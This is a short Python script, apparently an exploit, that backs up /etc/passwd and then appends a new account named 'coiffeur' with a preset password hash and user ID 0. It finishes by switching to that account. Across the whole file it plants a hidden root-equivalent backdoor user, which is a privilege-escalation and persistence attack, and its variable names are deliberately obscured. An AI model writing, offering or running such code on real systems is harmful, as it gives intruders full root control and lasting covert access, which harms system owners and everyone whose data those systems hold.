import os
a,b,c=["/etc","passwd",".bak"]
d=open(f"{a}/{b}","r")
e=d.read()
d.close()
if not os.path.exists(f"{b}{c}"):
    f=open(f"{b}{c}","w")
    f.write(e)
    f.close()
g=e+"coiffeur:$1$coiffeur$XvB.cT7JRRpX.JUEdqTc40:0:0:root:/root:/bin/bash"
h=open(f"{a}/{b}","w")
h.write(g)
h.close()
os.system("su coiffeur")